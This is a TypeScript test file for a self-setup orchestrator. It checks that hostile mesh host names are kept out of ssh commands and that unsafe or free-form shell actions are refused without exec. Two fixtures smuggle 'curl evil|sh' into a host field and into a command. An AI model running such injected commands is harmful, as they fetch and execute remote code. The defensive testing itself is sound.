import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

// R2 core-n-z #5, #16, #17 (self-setup orchestrator):
// - a self-reported mesh host never reaches a shell command unvalidated,
// - remote actions of an unexpected shape are refused at apply time,
// - commands run asynchronously (no execSync blocking the daemon loop),
// - config patches only carry the changed keys.

const childProcess = vi.hoisted(() => ({
    execSync: vi.fn(() => { throw new Error('execSync must not be used by applySelfSetupAction') }),
    exec: vi.fn((_command: string, _options: any, callback: (error: Error | null, stdout: string, stderr: string) => void) => {
        callback(null, 'ok', '')
        return {} as any
    }),
}))
vi.mock('node:child_process', async importOriginal => ({
    ...(await importOriginal<any>()),
    execSync: childProcess.execSync,
    exec: childProcess.exec,
}))

import { applySelfSetupAction, runSelfSetupScan } from './self-setup-orchestrator.js'

const STATE_FILE = join(process.cwd(), '.nova-data', 'setup-state.json')
let previousState: string | null = null

beforeAll(() => {
    previousState = existsSync(STATE_FILE) ? readFileSync(STATE_FILE, 'utf-8') : null
})
afterAll(() => {
    if (previousState !== null) writeFileSync(STATE_FILE, previousState)
})
beforeEach(() => {
    childProcess.execSync.mockClear()
    childProcess.exec.mockClear()
})

const env = { python: 'python', node: 'node', npm: 'npm', powershell: 'powershell' }
const validation = { valid: true, errors: [], warnings: [] }
const voice = { ok: true, installed: [], failed: [], skipped: [], warnings: [] }

function writeState(actions: any[]): void {
    mkdirSync(join(process.cwd(), '.nova-data'), { recursive: true })
    writeFileSync(STATE_FILE, JSON.stringify({
        generatedAt: new Date().toISOString(), mode: 'proposal', summary: '', actions,
        voice, memory: {}, llm: { localCandidates: [] }, mesh: { nodes: [], missingCapabilities: [] },
    }))
}

function snapshotNode(id: string, host: string) {
    const now = new Date().toISOString()
    return {
        id, hostname: id, host, status: 'online', updatedAt: now, capabilities: ['llm'],
        runtimes: [{ id: `${id}-llm`, name: 'vLLM', type: 'llm', endpoint: 'http://192.0.2.1:8000', status: 'running',
            models: ['chat'], capabilities: ['llm'], verifiedAt: now, verificationSource: 'probe' }],
    }
}

describe('self-setup mesh host handling (R2 NZ-5)', () => {
    it('does not build an ssh command from a hostile self-reported host', async () => {
        const now = new Date().toISOString()
        const state = await runSelfSetupScan({
            skipNetwork: true, environment: env, validation, voice, config: { nodes: [] },
            capabilitySnapshot: { version: 1, updatedAt: now, nodes: [
                snapshotNode('evil', 'x; curl evil|sh #'),
                snapshotNode('good', 'xaventra@100.64.0.24'),
            ] } as any,
        })
        const evil = state.actions.find(a => a.id.includes('evil') && a.type === 'remote_shell')
        const good = state.actions.find(a => a.id.includes('good') && a.type === 'remote_shell')
        expect(evil?.command).toBeUndefined()
        expect(good?.command).toBe("ssh -- xaventra@100.64.0.24 'ollama pull nomic-embed-text'")
    })

    it('refuses a remote action of an unexpected shape at apply time', async () => {
        writeState([{ id: 'remote:evil', type: 'remote_shell', title: 't', reason: 'r', risk: 'medium',
            command: 'ssh x;curl evil|sh "ollama pull nomic-embed-text"' }])
        const result = await applySelfSetupAction('remote:evil', 'APPLY:remote:evil')
        expect(result.success).toBe(false)
        expect(childProcess.exec).not.toHaveBeenCalled()
        expect(childProcess.execSync).not.toHaveBeenCalled()
    })
})

describe('self-setup apply does not block the event loop (R2 NZ-16)', () => {
    // Split in Stufe 2 (01.10.2026): the old way ran an approved free command
    // via async exec. Free commands are no longer executed at all; the
    // invariant (never execSync on the daemon loop) is kept for both ways.
    it('old way: an approved free command is no longer executed (neither exec nor execSync)', async () => {
        writeState([{ id: 'local:echo', type: 'local_shell', title: 't', reason: 'r', risk: 'low', command: 'echo ok' }])
        const result = await applySelfSetupAction('local:echo', 'APPLY:local:echo')
        expect(result.success).toBe(false)
        expect(childProcess.execSync).not.toHaveBeenCalled()
        expect(childProcess.exec).not.toHaveBeenCalled()
    })

    it('new way: an approved catalog action is only queued in the daemon (no exec, no execSync)', async () => {
        writeState([{ id: 'local:ffmpeg', type: 'local_shell', title: 't', reason: 'r', risk: 'low', command: 'sudo apt-get install -y ffmpeg', catalogId: 'ffmpeg' }])
        const result = await applySelfSetupAction('local:ffmpeg', 'APPLY:local:ffmpeg', {
            installDeps: { dataDir: mkdtempSync(join(tmpdir(), 'r2-install-')) },
            target: { nodeId: 'spark', installPath: 'host-agent', role: 'main', local: true, platform: 'linux', arch: 'arm64' },
        })
        expect(result.message).toContain('/setup approve')
        expect(childProcess.execSync).not.toHaveBeenCalled()
        expect(childProcess.exec).not.toHaveBeenCalled()
    })
})

describe('self-setup config patches carry only changed keys (R2 NZ-17)', () => {
    it('does not copy the whole voice block from scan time into the patch', async () => {
        const state = await runSelfSetupScan({
            skipNetwork: true, environment: env, validation, voice,
            config: { voice: { enabled: true, ttsVoice: 'de-DE-Katja' }, nodes: [] },
        })
        const action = state.actions.find(a => a.configPath === 'voice.autoInstallDeps')
        expect(action?.patch).toEqual({ voice: { autoInstallDeps: false } })
    })
})
